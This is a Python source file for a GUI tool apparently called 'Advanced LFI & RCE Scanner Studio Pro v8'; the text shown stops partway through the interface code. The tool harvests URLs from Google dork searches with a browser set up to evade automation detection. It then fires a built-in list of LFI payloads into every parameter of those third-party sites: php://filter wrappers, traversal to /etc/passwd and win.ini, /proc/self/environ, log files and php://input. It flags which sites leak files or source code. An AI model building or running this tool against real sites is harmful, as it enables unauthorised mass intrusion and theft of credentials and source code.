#!/usr/bin/env python3
"""
Advanced LFI & RCE Scanner & Multi-Input Smart Link Scraper Studio Pro v8
- Integrated robust 'about:blank' & window-stuck bypass logic from user's classic scraper
- Smooth Asynchronous 1000+ URL Scanning with Zero UI Freezing
- Right-Click Menu Options: 'Copy URL', 'Open Response in Browser', 'View Req/Res'
- Log Filter Search Field & Non-blocking File Uploads
- Comprehensive Payload Signatures & Classifiers
"""

from __future__ import annotations

import csv
import json
import queue
import re
import socket
import threading
import time
import os
import sys
import random
import base64
import tempfile
import webbrowser
from pathlib import Path
from tkinter import filedialog, messagebox, ttk
import tkinter as tk
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse, parse_qs
from dataclasses import asdict, dataclass

import requests
import urllib3

# Selenium & WebDriver Manager
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains

try:
    import pyautogui
except ImportError:
    try:
        os.system("pip install pyautogui")
        import pyautogui
    except:
        pyautogui = None

try:
    import pandas as pd
except ImportError:
    pd = None

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

APP_NAME = "Advanced LFI & RCE Scanner Studio Pro v8"
RESULT_CSV = "lfi_lab_results.csv"
RESULT_JSON = "lfi_lab_results.json"
DEFAULT_TIMEOUT = 8
DEFAULT_WORKERS = 4
MAX_QUEUE = 50000

# Comprehensive Professional LFI, RCE & Wrapper Payloads List
ADVANCED_PROBES = [
    ("FILTER_BASE64_INDEX", "php://filter/convert.base64-encode/resource=index"),
    ("FILTER_BASE64_INDEX_PHP", "php://filter/convert.base64-encode/resource=index.php"),
    ("FILTER_BASE64_INICIO", "php://filter/convert.base64-encode/resource=inicio"),
    ("FILTER_BASE64_DEFAULT", "php://filter/convert.base64-encode/resource=default"),
    ("FILTER_BASE64_CONFIG", "php://filter/convert.base64-encode/resource=config"),
    ("FILTER_BASE64_CONFIG_FILE", "php://filter/convert.base64-encode/resource=configuration"),
    ("FILTER_BASE64_WP_CONFIG", "php://filter/convert.base64-encode/resource=wp-config"),
    ("FILTER_BASE64_DOT_INDEX", "php://filter/convert.base64-encode/resource=../index.php"),
    ("FILTER_BASE64_DOT_CONFIG", "php://filter/convert.base64-encode/resource=../config.php"),
    ("FILTER_BASE64_DOT2_INDEX", "php://filter/convert.base64-encode/resource=../../index.php"),
    ("FILTER_ROT13_INDEX", "php://filter/read=string.rot13/resource=index.php"),
    ("FILTER_ROT13_IDX", "php://filter/read=string.rot13/resource=index"),
    ("FILTER_UTF16_INDEX", "php://filter/convert.iconv.utf-8.utf-16/resource=index.php"),
    ("FILTER_UTF16_IDX", "php://filter/convert.iconv.utf-8.utf-16/resource=index"),
    ("FILTER_TOUPPER_INDEX", "php://filter/read=string.toupper/resource=index.php"),
    ("FILTER_TOLOWER_INDEX", "php://filter/read=string.tolower/resource=index.php"),
    ("FILTER_ZLIB_INDEX", "php://filter/zlib.deflate/convert.base64-encode/resource=index.php"),
    ("FILTER_ZLIB_IDX", "php://filter/zlib.deflate/convert.base64-encode/resource=index"),
    ("WIN_INI_PATH1", "C:\\Windows\\win.ini"),
    ("WIN_INI_PATH2", "C:/Windows/win.ini"),
    ("WIN_INI_TRAV1", "../../../../../../../../../windows/win.ini"),
    ("WIN_INI_TRAV2", "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"),
    ("BOOT_INI_TRAV", "../../../../../../../../../boot.ini"),
    ("BOOT_INI_PATH", "C:\\boot.ini"),
    ("WIN_HOSTS_PATH", "C:\\Windows\\System32\\drivers\\etc\\hosts"),
    ("WIN_HOSTS_TRAV", "../../../../../../../../../windows/system32/drivers/etc/hosts"),
    ("WIN_INI_NULL", "../../../../../../../../../windows/win.ini%00"),
    ("WIN_INI_DOTNULL", "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini%00"),
    ("WIN_INI_CNULL", "C:\\Windows\\win.ini%00"),
    ("PASSWD_NULL", "../../../../../../../../../etc/passwd%00"),
    ("PASSWD_NULL_DIRECT", "/etc/passwd%00"),
    ("PASSWD_DOTS1", "....//....//....//....//....//....//etc/passwd"),
    ("WIN_DOTS1", "....//....//....//....//....//....//windows/win.ini"),
    ("WIN_SLASH1", "....\\/....\\/....\\/....\\/....\\/windows\\/win.ini"),
    ("PASSWD_ENC1", "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"),
    ("WIN_ENC1", "..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini"),
    ("PASSWD_ENC2", "..%252f..%252f..%252f..%252fetc%252fpasswd"),
    ("PASSWD_STD", "/etc/passwd"),
    ("PASSWD_TRAV1", "../../../../../../etc/passwd"),
    ("PASSWD_TRAV2", "../../../../../../../../../../../../../../../etc/passwd"),
    ("HOSTS_STD", "/etc/hosts"),
    ("ISSUE_STD", "/etc/issue"),
    ("ENVIRON_STD", "/proc/self/environ"),
    ("ENVIRON_NULL", "/proc/self/environ%00"),
    ("ENVIRON_TRAV1", "../../../../../../proc/self/environ"),
    ("ENVIRON_TRAV2", "../../../../../../proc/self/environ%00"),
    ("ENVIRON_TRAV3", "../../../../../../../../../../../proc/self/environ"),
    ("ENVIRON_TRAV4", "../../../../../../../../../../../proc/self/environ%00"),
    ("ENVIRON_ENC", "..%2f..%2f..%2f..%2f..%2f..%2fproc%2fself%2fenviron"),
    ("ENVIRON_DOTS", "....//....//....//....//....//....//proc/self/environ"),
    ("CMDLINE_STD", "/proc/self/cmdline"),
    ("CMDLINE_TRAV1", "../../../../../../proc/self/cmdline"),
    ("CMDLINE_TRAV2", "../../../../../../../../../../../proc/self/cmdline"),
    ("PROC_VERSION", "/proc/version"),
    ("PROC_VERSION_TRAV", "../../../../../../../../../../../proc/version"),
    ("PROC_STATUS", "/proc/self/status"),
    ("PROC_FD0", "/proc/self/fd/0"),
    ("PROC_FD1", "/proc/self/fd/1"),
    ("PROC_FD2", "/proc/self/fd/2"),
    ("APACHE_ACCESS", "/var/log/apache2/access.log"),
    ("APACHE_ERROR", "/var/log/apache2/error.log"),
    ("HTTPD_ACCESS", "/var/log/httpd/access_log"),
    ("HTTPD_ERROR", "/var/log/httpd/error_log"),
    ("NGINX_ACCESS", "/var/log/nginx/access.log"),
    ("NGINX_ERROR", "/var/log/nginx/error.log"),
    ("XAMPP_ACCESS", "C:\\xampp\\apache\\logs\\access.log"),
    ("XAMPP_ERROR", "C:\\xampp\\apache\\logs\\error.log"),
    ("DATA_EXEC_PROBE", "data://text/plain,LFITORNADO_EXEC_PROBE"),
    ("DATA_BASE64_PROBE", "data://text/plain;base64,TEZJVE9STkFET19FWEVDX1BST0JF"),
    ("PHP_INPUT", "php://input"),
]

LFI_SIGNATURES = [
    "root:x:", "bin:x:", "[fonts]", "[extensions]", "[mci extensions]", "[files]", "[Mail]", 
    "MAPI=1", "[boot loader]", "[operating systems]", "127.0.0.1 localhost", "Linux version", 
    "C:\\Windows", "/bin/bash", "/bin/sh", "nobody:x:", "open_basedir restriction in effect",
    "Failed opening required", "failed to open stream", "No such file or directory"
]

RCE_SIGNATURES = [
    "LFITORNADO_EXEC_PROBE", "HTTP_USER_AGENT", "DOCUMENT_ROOT", "GATEWAY_INTERFACE", 
    "REQUEST_METHOD", "SERVER_SOFTWARE", "REMOTE_ADDR", "HTTP_ACCEPT", "PATH=/usr",
    "System => Windows", "System => Linux"
]

BASE64_SOURCE_SIGNATURES = [
    "PD9waHA", "PD9QSF", "PCEtLQ", "PCFkb2N", "PGh0bW", "<?php", "<?=__", "zend_", 
    "Loaded Configuration File", "PHP Version", "Warning: include", "Warning: require"
]

WAF_MARKERS = (
    "cloudflare", "mod_security", "modsecurity", "sucuri", "imperva", 
    "akamai", "blocked by", "web application firewall", "request rejected"
)


@dataclass
class Finding:
    timestamp: str
    url: str
    parameter: str
    method: str
    probe: str
    status: int
    response_time: float
    response_length: int
    baseline_length: int
    classification: str
    evidence: str
    full_request: str
    full_response: str


class Scanner:
    def __init__(self, ui_queue: queue.Queue):
        self.ui_queue = ui_queue
        self.stop_event = threading.Event()
        self.pause_event = threading.Event()
        self.pause_event.set()
        self.lock = threading.Lock()

        self.urls: list[str] = []
        self.tasks: queue.Queue[tuple[str, str, str]] = queue.Queue(maxsize=MAX_QUEUE)
        self.findings: list[Finding] = []
        self.seen_tasks: set[tuple[str, str, str]] = set()
        self.custom_probes = list(ADVANCED_PROBES)

        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AdvancedScanner/4.0",
            "Accept": "*/*",
        })

        self.workers = DEFAULT_WORKERS
        self.total_tasks = 0
        self.completed = 0
        self.running = False

    def emit(self, kind: str, data=None):
        self.ui_queue.put((kind, data))

    @staticmethod
    def is_allowed_url(url: str) -> bool:
        try:
            p = urlparse(url)
            return p.scheme in ("http", "https") and bool(p.hostname)
        except Exception:
            return False

    @staticmethod
    def normalize_url(url: str) -> str | None:
        try:
            url = str(url).strip().strip('\"\'')
            if not url or len(url) > 8192:
                return None
            if not re.match(r"^https?://", url, re.I):
                url = "http://" + url
            p = urlparse(url)
            if not p.hostname:
                return None
            return urlunparse((p.scheme, p.netloc, p.path or "/", p.params, p.query, ""))
        except:
            return None

    @staticmethod
    def read_url_file(file_path: str) -> list[str]:
        p = Path(file_path)
        if not p.exists() or not p.is_file():
            return []
        suffix = p.suffix.lower()
        if suffix in (".xlsx", ".xls", ".xlsm"):
            if pd is None:
                raise RuntimeError("Excel support requires pandas & openpyxl.")
            frames = pd.read_excel(p, sheet_name=None, header=None)
            values = []
            for _, frame in frames.items():
                for value in frame.astype(str).fillna("").to_numpy().ravel():
                    value = str(value).strip()
                    if re.match(r"^https?://", value, re.I):
                        values.append(value)
            return values
        if suffix == ".csv":
            if pd is None:
                with p.open("r", encoding="utf-8-sig", errors="ignore", newline="") as f:
                    rows = csv.reader(f)
                    values = []
                    for row in rows:
                        values.extend(cell.strip() for cell in row if cell.strip())
                    return values
            frame = pd.read_csv(p, header=None, dtype=str, keep_default_na=False)
            values = []
            for value in frame.to_numpy().ravel():
                value = str(value).strip()
                if value:
                    values.append(value)
            return values
        return p.read_text(encoding="utf-8", errors="ignore").splitlines()

    @staticmethod
    def parameter_names(url: str) -> list[str]:
        try:
            return list(dict.fromkeys(k for k, _ in parse_qsl(urlparse(url).query, keep_blank_values=True)))
        except:
            return []

    @staticmethod
    def replace_parameter(url: str, parameter: str, value: str) -> str:
        p = urlparse(url)
        pairs = parse_qsl(p.query, keep_blank_values=True)
        new_pairs = [(key, value if key == parameter else old_value) for key, old_value in pairs]
        return urlunparse((p.scheme, p.netloc, p.path, p.params, urlencode(new_pairs, doseq=True), ""))

    @staticmethod
    def form_data(url: str, parameter: str, value: str) -> dict[str, str]:
        pairs = parse_qsl(urlparse(url).query, keep_blank_values=True)
        return {k: value if k == parameter else v for k, v in pairs}

    def load_urls(self, raw_text: str, file_path: str = "") -> int:
        values = []
        if raw_text.strip():
            values.extend(raw_text.splitlines())
        if file_path:
            try:
                values.extend(self.read_url_file(file_path))
            except Exception as exc:
                self.emit("log", f"[FILE ERROR] {exc}")
                return 0

        normalized, seen = [], set()
        for raw in values:
            url = self.normalize_url(raw)
            if not url or url in seen:
                continue
            seen.add(url)
            if not self.is_allowed_url(url):
                continue
            normalized.append(url)
        self.urls = normalized
        return len(normalized)

    def build_tasks_background(self):
        """Lazy asynchronous task building to completely eliminate UI freezes for 1000+ URLs"""
        self.tasks = queue.Queue(maxsize=MAX_QUEUE)
        self.seen_tasks.clear()
        count = 0

        for url in self.urls:
            if self.stop_event.is_set():
                break
            params = self.parameter_names(url)
            if not params:
                continue
            for param in params:
                for probe_name, probe in self.custom_probes:
                    task = (url, param, probe_name)
                    if task in self.seen_tasks:
                        continue
                    self.seen_tasks.add(task)
                    self.tasks.put((url, param, probe))
                    count += 1

        self.total_tasks = count
        self.completed = 0
        self.emit("stats", {
            "total_urls": len(self.urls),
            "total_tasks": self.total_tasks,
            "params": sum(len(self.parameter_names(u)) for u in self.urls),
        })
        self.emit("log", f"[READY] Task queue built successfully: {self.total_tasks} tasks queued.")

    def wait_if_paused(self):
        while not self.pause_event.is_set() and not self.stop_event.is_set():
            time.sleep(0.15)

    def request_get(self, url: str):
        started = time.perf_counter()
        r = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=False, allow_redirects=False)
        req_dump = f"GET {url} HTTP/1.1\nHost: {urlparse(url).netloc}\n"
        for k, v in self.session.headers.items():
            req_dump += f"{k}: {v}\n"
        res_dump = f"HTTP/1.1 {r.status_code}\n"
        for k, v in r.headers.items():
            res_dump += f"{k}: {v}\n"
        res_dump += f"\n{r.text}"
        return r, time.perf_counter() - started, req_dump, res_dump

    def request_post(self, url: str, parameter: str, value: str):
        data = self.form_data(url, parameter, value)
        encoded_data = urlencode(data)
        started = time.perf_counter()
        r = self.session.post(url, data=data, timeout=DEFAULT_TIMEOUT, verify=False, allow_redirects=False)
        req_dump = f"POST {url} HTTP/1.1\nHost: {urlparse(url).netloc}\nContent-Type: application/x-www-form-urlencoded\nContent-Length: {len(encoded_data)}\n"
        for k, v in self.session.headers.items():
            req_dump += f"{k}: {v}\n"
        req_dump += f"\n{encoded_data}"
        res_dump = f"HTTP/1.1 {r.status_code}\n"
        for k, v in r.headers.items():
            res_dump += f"{k}: {v}\n"
        res_dump += f"\n{r.text}"
        return r, time.perf_counter() - started, req_dump, res_dump

    def baseline(self, url: str) -> tuple[int, float, str]:
        try:
            r, elapsed, _, _ = self.request_get(url)
            return len(r.text), elapsed, r.text
        except requests.RequestException as exc:
            return -1, 0.0, f"ERROR:{exc}"

    def classify(self, response, baseline_length: int, elapsed: float) -> tuple[str, str]:
        body = response.text or ""
        low = body.lower()

        for sig in RCE_SIGNATURES:
            if sig.lower() in low:
                return "VULNERABLE_RCE", f"RCE Indicator matched: '{sig}'"

        for sig in BASE64_SOURCE_SIGNATURES:
            if sig in body:
                return "VULNERABLE_SOURCE_DISCLOSURE", f"Source / Base64 Filter matched: '{sig}'"

        for sig in LFI_SIGNATURES:
            if sig.lower() in low:
                return "VULNERABLE_LFI", f"LFI File Signature matched: '{sig}'"

        if response.status_code in (403, 406):
            return "BLOCKED", f"HTTP {response.status_code}"
        if any(marker in low for marker in WAF_MARKERS):
            return "WAF_OR_BLOCK_PAGE", "WAF or security firewall page detected"
        if baseline_length >= 0:
            delta = abs(len(body) - baseline_length)
            threshold = max(250, int(baseline_length * 0.35))
            if delta >= threshold:
                return "ANOMALY_REVIEW", f"Response length delta={delta}"
        return "NO_INDICATION", ""

    def test_one(self, url: str, parameter: str, probe: str, probe_name: str):
        baseline_length, _, baseline_body = self.baseline(url)
        if baseline_length < 0:
            self.record(url, parameter, "GET", probe_name, 0, 0, 0, baseline_length, "REQUEST_ERROR", baseline_body[:300], "N/A", "N/A")
            return

        test_url = self.replace_parameter(url, parameter, probe)
        try:
            response, elapsed, req_dump, res_dump = self.request_get(test_url)
            classification, evidence = self.classify(response, baseline_length, elapsed)
            self.record(test_url, parameter, "GET", probe_name, response.status_code, elapsed, len(response.text or ""), baseline_length, classification, evidence, req_dump, res_dump)

            if response.status_code in (403, 406):
                self.wait_if_paused()
                if self.stop_event.is_set():
                    return
                post_response, post_elapsed, p_req, p_res = self.request_post(url, parameter, probe)
                post_classification, post_evidence = self.classify(post_response, baseline_length, post_elapsed)
                self.record(url, parameter, "POST", probe_name, post_response.status_code, post_elapsed, len(post_response.text or ""), baseline_length, post_classification, post_evidence or "POST fallback after GET block", p_req, p_res)
        except requests.RequestException as exc:
            self.record(test_url, parameter, "GET", probe_name, 0, 0, 0, baseline_length, "REQUEST_ERROR", str(exc)[:300], "N/A", "N/A")

    def record(self, url, parameter, method, probe, status, response_time, response_length, baseline_length, classification, evidence, req_dump, res_dump):
        finding = Finding(
            timestamp=time.strftime("%Y-%m-%d %H:%M:%S"), url=url, parameter=parameter,
            method=method, probe=probe, status=status, response_time=round(response_time, 4),
            response_length=response_length, baseline_length=baseline_length,
            classification=classification, evidence=evidence,
            full_request=req_dump, full_response=res_dump
        )
        with self.lock:
            self.findings.append(finding)
            self.completed += 1
        self.emit("finding", asdict(finding))
        self.emit("progress", (self.completed, self.total_tasks))

    def worker(self, worker_id: int):
        while not self.stop_event.is_set():
            self.wait_if_paused()
            if self.stop_event.is_set():
                break
            try:
                url, parameter, probe = self.tasks.get(timeout=0.2)
            except queue.Empty:
                if not self.running:
                    break
                continue
            try:
                probe_name = next(name for name, payload in self.custom_probes if payload == probe)
                self.test_one(url, parameter, probe, probe_name)
            finally:
                self.tasks.task_done()

    def start(self, workers: int):
        if self.running:
            return
        self.workers = max(1, min(workers, 16))
        self.stop_event.clear()
        self.pause_event.set()
        self.running = True

        def init_and_run():
            self.build_tasks_background()
            if self.total_tasks == 0:
                self.running = False
                self.emit("log", "[STOP] No parameter tasks found.")
                return

            threads = []
            for i in range(self.workers):
                t = threading.Thread(target=self.worker, args=(i + 1,), daemon=True)
                t.start()
                threads.append(t)

            for t in threads:
                t.join()

            self.running = False
            self.emit("done", "STOPPED" if self.stop_event.is_set() else "COMPLETED")

        threading.Thread(target=init_and_run, daemon=True).start()
        self.emit("log", f"[INIT] Initializing scan tasks asynchronously with {self.workers} workers...")

    def pause(self):
        if self.running:
            self.pause_event.clear()

    def resume(self):
        if self.running:
            self.pause_event.set()

    def stop(self):
        self.stop_event.set()
        self.pause_event.set()

    def save_reports(self):
        with self.lock:
            rows = [asdict(x) for x in self.findings]
        with open(RESULT_JSON, "w", encoding="utf-8") as f:
            json.dump(rows, f, indent=2, ensure_ascii=False)
        fields = ["timestamp", "url", "parameter", "method", "probe", "status", "response_time", "response_length", "baseline_length", "classification", "evidence"]
        with open(RESULT_CSV, "w", newline="", encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=fields, extrasaction='ignore')
            writer.writeheader()
            writer.writerows(rows)
        return len(rows)


class LinkScraperWorker(threading.Thread):
    def __init__(self, queries_list, target_path, target_param, max_pages, callback_log, on_url_scraped, on_complete):
        super().__init__()
        self.queries_list = [q.strip() for q in queries_list if q.strip()]
        self.target_path = target_path.strip()
        self.target_param = target_param.strip()
        self.max_pages = max_pages
        self.callback_log = callback_log
        self.on_url_scraped = on_url_scraped
        self.on_complete = on_complete
        self.stop_signal = threading.Event()
        self.daemon = True
        self.driver = None

    def clear_windows_popup(self):
        try:
            if pyautogui:
                pyautogui.press('esc')
        except:
            pass

    def check_and_solve_captcha(self, driver):
        try:
            frames = driver.find_elements(By.TAG_NAME, "iframe")
            captcha_found = False
            for frame in frames:
                src = frame.get_attribute("src")
                if src and "recaptcha" in src:
                    captcha_found = True
                    break
            if captcha_found or len(driver.find_elements(By.XPATH, "//*[contains(@id, 'recaptcha')]")) > 0:
                self.callback_log("\n⚠️ CAPTCHA detected! Please solve it manually in browser...", "WARNING")
                time.sleep(25)
                return True
        except:
            pass
        return False

    def is_parameter_matched(self, url):
        try:
            parsed_url = urlparse(url)
            if self.target_path and self.target_path not in parsed_url.path:
                return False
            query_params = parse_qs(parsed_url.query)
            if self.target_param and self.target_param in query_params:
                return True
            return False
        except:
            return False

    def get_flexible_search_elements(self, driver):
        elements = []
        try:
            search_blocks = driver.find_elements(By.CSS_SELECTOR, 'div.yuRUbf a, div.g a')
            for a in search_blocks:
                try:
                    href = a.get_attribute('href')
                    if href and href.startswith('http'):
                        if not any(domain in href for domain in ['google.', 'youtube.', 'gstatic.', 'googleapis.com']):
                            if len(a.find_elements(By.TAG_NAME, 'h3')) > 0:
                                if a not in elements:
                                    elements.append(a)
                except:
                    continue
            if not elements:
                h3_tags = driver.find_elements(By.CSS_SELECTOR, 'h3.LC20lb')
                for h3 in h3_tags:
                    try:
                        parent_a = h3.find_element(By.XPATH, './ancestor::a')
                        if parent_a not in elements:
                            elements.append(parent_a)
                    except:
                        continue
        except Exception as e:
            pass
        return elements

    def run(self):
        log = self.callback_log

        options = webdriver.ChromeOptions()
        options.add_argument("--start-maximized")
        options.add_argument("--disable-gpu")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        options.add_argument("--lang=en-US")

        log("Launching Visual Chrome Browser via WebDriver Manager...", "INFO")
        try:
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=options)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        except Exception as e:
            log(f"[Error] Failed with WebDriver Manager: {e}", "ERROR")
            try:
                self.driver = webdriver.Chrome(options=options)
            except Exception as e2:
                log(f"[Fatal Error] Could not start browser: {e2}", "ERROR")
                return

        raw_csv_filename = "raw_scraped_links.csv"
        pd.DataFrame(columns=["Raw_URLs"]).to_csv(raw_csv_filename, index=False, encoding='utf-8')
        seen_links = set()

        try:
            for q_index, query in enumerate(self.queries_list):
                if self.stop_signal.is_set():
                    break
                
                log(f"\n================================", "INFO")
                log(f"[{q_index + 1}/{len(self.queries_list)}] Searching Dork Query: {query}", "INFO")
                log(f"================================", "INFO")

                search_url = f"https://www.google.com/search?q={query}&hl=en"
                self.driver.get(search_url)
                time.sleep(2)

                current_page = 1
                main_window_handle = self.driver.current_window_handle

                while current_page <= self.max_pages and not self.stop_signal.is_set():
                    log(f"--- Scraping Page {current_page} for Query: [{query}] ---", "INFO")
                    time.sleep(1.5)
                    self.check_and_solve_captcha(self.driver)
                    self.driver.execute_script("window.scrollTo(0, 0);")
                    time.sleep(0.5)

                    link_elements = self.get_flexible_search_elements(self.driver)
                    total_results = len(link_elements)
                    log(f"Found {total_results} results on page {current_page}", "INFO")

                    index = 0
                    while index < total_results and not self.stop_signal.is_set():
                        try:
                            self.driver.switch_to.window(main_window_handle)
                            link_elements_refresh = self.get_flexible_search_elements(self.driver)
                            if index >= len(link_elements_refresh):
                                break

                            elem = link_elements_refresh[index]
                            self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", elem)
                            time.sleep(0.3)

                            modifier_key = Keys.COMMAND if sys.platform == 'darwin' else Keys.CONTROL
                            actions = ActionChains(self.driver)
                            actions.key_down(modifier_key).click(elem).key_up(modifier_key).perform()
                            time.sleep(1.2)

                            all_windows = self.driver.window_handles
                            if len(all_windows) > 1:
                                new_window = [w for w in all_windows if w != main_window_handle][0]
                                self.driver.switch_to.window(new_window)
                                self.clear_windows_popup()

                                start_wait = time.time()
                                actual_url = self.driver.current_url
                                while ("google.com" in actual_url or "google/url" in actual_url or actual_url == "about:blank") and (time.time() - start_wait < 6):
                                    time.sleep(0.2)
                                    self.clear_windows_popup()
                                    try:
                                        actual_url = self.driver.current_url
                                    except:
                                        break

                                if "google.com" in actual_url or "about:blank" in actual_url:
                                    try:
                                        actual_url = self.driver.execute_script("return window.location.href;")
                                    except:
                                        pass

                                # [SOLVED]: about:blank বাইপাস করার জন্য উইন্ডোজ স্কিপিং কন্ডিশন
                                if actual_url and "about:blank" in actual_url:
                                    log("   ❌ [Bypassed] Window stuck on about:blank. Skipping link...", "WARNING")
                                    self.driver.close()
                                    self.driver.switch_to.window(main_window_handle)
                                    index += 1
                                    continue

                                if actual_url and actual_url.startswith('http') and 'google.' not in actual_url and 'download' not in actual_url.lower():
                                    parsed = urlparse(actual_url)
                                    hostname = parsed.hostname.lower() if parsed.hostname else ""
                                    
                                    if hostname.endswith(".bd") or hostname.endswith(".sa") or ".bd/" in actual_url or ".sa/" in actual_url:
                                        log(f"   [-] Skipped (.bd / .sa restricted domain): {actual_url}", "WARNING")
                                    else:
                                        if self.is_parameter_matched(actual_url):
                                            if actual_url not in seen_links:
                                                seen_links.add(actual_url)
                                                df = pd.DataFrame([{"Raw_URLs": actual_url}])
                                                df.to_csv(raw_csv_filename, mode='a', index=False, header=False, encoding='utf-8')
                                                log(f"   ↳ [Copied & Saved]: {actual_url}", "SUCCESS")
                                                if self.on_url_scraped:
                                                    self.on_url_scraped(actual_url)

                                self.driver.close()
                                self.driver.switch_to.window(main_window_handle)
                                time.sleep(0.5)

                            index += 1
                        except Exception as ex:
                            log(f"Error at index {index}: {ex}", "ERROR")
                            try:
                                if len(self.driver.window_handles) > 1:
                                    self.driver.close()
                                self.driver.switch_to.window(main_window_handle)
                            except:
                                pass
                            index += 1

                    try:
                        self.driver.switch_to.window(main_window_handle)
                        self.driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
                        time.sleep(1)

                        next_button = self.driver.find_element(By.ID, 'pnnext')
                        if next_button and current_page < self.max_pages:
                            log(f"Moving to next page ({current_page + 1}) for query...", "INFO")
                            next_button.click()
                            current_page += 1
                            time.sleep(3)
                        else:
                            log(f"Finished query pages for: [{query}]", "INFO")
                            break
                    except:
                        break

        except Exception as e:
            log(f"Scraper error: {e}", "ERROR")
        finally:
            if self.driver:
                try:
                    self.driver.quit()
                except:
                    pass
            log(f"\n[!] Scraping complete. Total unique external links matched: {len(seen_links)}", "SUCCESS")
            if self.on_complete:
                self.on_complete(raw_csv_filename)

    def stop(self):
        self.stop_signal.set()
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass


class App:
    def __init__(self, root: tk.Tk):
        self.root = root
        self.root.title(APP_NAME)
        self.root.geometry("1450x850")
        self.root.minsize(1100, 700)

        self.events = queue.Queue()
        self.scanner = Scanner(self.events)
        self.scraper_worker = None

        self.url_file = tk.StringVar()
        self.workers_var = tk.IntVar(value=DEFAULT_WORKERS)
        self.status_var = tk.StringVar(value="Idle")
        self.progress_var = tk.DoubleVar(value=0)
        self.count_var = tk.StringVar(value="0 / 0")

        # Scraper Configuration Vars
        self.scraper_path_var = tk.StringVar(value="home.php")
        self.scraper_param_var = tk.StringVar(value="page")
        self.scraper_pages_var = tk.IntVar(value=3)
        self.auto_scan_var = tk.BooleanVar(value=True)

        self.build_ui()
        self.root.after(100, self.process_events)
        self.root.protocol("WM_DELETE_WINDOW", self.close)

    def build_ui(self):
        self.main_notebook = ttk.Notebook(self.root)
        self.main_notebook.pack(fill="both", expand=True, padx=10, pady=5)

        # Tab 1: Scanner & Payloads Studio
        scanner_tab = ttk.Frame(self.main_notebook, padding=10)
        self.main_notebook.add(scanner_tab, text="LFI & RCE Scanner Studio")

        top = ttk.Frame(scanner_tab)
        top.pack(fill="x")
        ttk.Label(top, text="Advanced LFI & RCE Vulnerability Scanner (Async Non-Blocking)", font=("Segoe UI", 14, "bold")).pack(anchor="w")

        main_paned = ttk.PanedWindow(scanner_tab, orient="horizontal")
        main_paned.pack(fill="both", expand=True, pady=5)

        left_frame = ttk.Frame(main_paned, padding=5)
        main_paned.add(left_frame, weight=3)

        url_frame = ttk.LabelFrame(left_frame, text="Target URLs Input (Non-blocking File Upload / 1000+ support)", padding=8)
        url_frame.pack(fill="x", pady=5)
        self.url_text = tk.Text(url_frame, height=4, wrap="none")
        self.url_text.pack(fill="x", pady=5)

        file_row = ttk.Frame(url_frame)
        file_row.pack(fill="x")
        ttk.Entry(file_row, textvariable=self.url_file).pack(side="left", fill="x", expand=True)
        ttk.Button(file_row, text="Browse File", command=self.browse_file_async).pack(side="left", padx=3)
        ttk.Button(file_row, text="Clear Targets", command=lambda: self.url_text.delete("1.0", "end")).pack(side="left", padx=3)

        controls = ttk.Frame(left_frame, padding=(0, 5, 0, 5))
        controls.pack(fill="x")
        ttk.Label(controls, text="Workers:").pack(side="left")
        ttk.Spinbox(controls, from_=1, to=16, textvariable=self.workers_var, width=4).pack(side="left", padx=(4, 10))

        self.start_btn = ttk.Button(controls, text="START SCAN", command=self.start_scan)
        self.start_btn.pack(side="left", padx=2)
        self.pause_btn = ttk.Button(controls, text="PAUSE", command=self.pause_scan)
        self.pause_btn.pack(side="left", padx=2)
        self.resume_btn = ttk.Button(controls, text="RESUME", command=self.resume_scan)
        self.resume_btn.pack(side="left", padx=2)
        self.stop_btn = ttk.Button(controls, text="STOP", command=self.stop_scan)
        self.stop_btn.pack(side="left", padx=2)
        ttk.Button(controls, text="Save Report", command=self.save_report).pack(side="left", padx=10)

        prog_row = ttk.Frame(left_frame)
        prog_row.pack(fill="x", pady=5)
        ttk.Progressbar(prog_row, variable=self.progress_var, maximum=100).pack(side="left", fill="x", expand=True)
        ttk.Label(prog_row, textvariable=self.count_var, width=12, anchor="e").pack(side="right", padx=5)
        ttk.Label(left_frame, textvariable=self.status_var, font=("Segoe UI", 9, "bold")).pack(anchor="w")

        res_frame = ttk.LabelFrame(left_frame, text="Live Scanner Results & Findings (Vulnerabilities Highlighted in Red, Right-Click for Options)", padding=5)
        res_frame.pack(fill="both", expand=True, pady=5)

        columns = ("time", "method", "parameter", "status", "response", "classification", "evidence", "url")
        self.tree = ttk.Treeview(res_frame, columns=columns, show="headings")
        headings = {"time": "Time", "method": "Method", "parameter": "Parameter", "status": "HTTP", "response": "Resp Len", "classification": "Classification", "evidence": "Evidence", "url": "URL"}
        widths = {"time": 120, "method": 60, "parameter": 80, "status": 50, "response": 70, "classification": 140, "evidence": 160, "url": 300}
        for col in columns:
            self.tree.heading(col, text=headings[col])
            self.tree.column(col, width=widths[col], anchor="w")

        self.tree.tag_configure("vulnerable", background="#ffcccc", foreground="#990000")

        yscroll = ttk.Scrollbar(res_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=yscroll.set)
        self.tree.grid(row=0, column=0, sticky="nsew")
        yscroll.grid(row=0, column=1, sticky="ns")
        res_frame.rowconfigure(0, weight=1)
        res_frame.columnconfigure(0, weight=1)

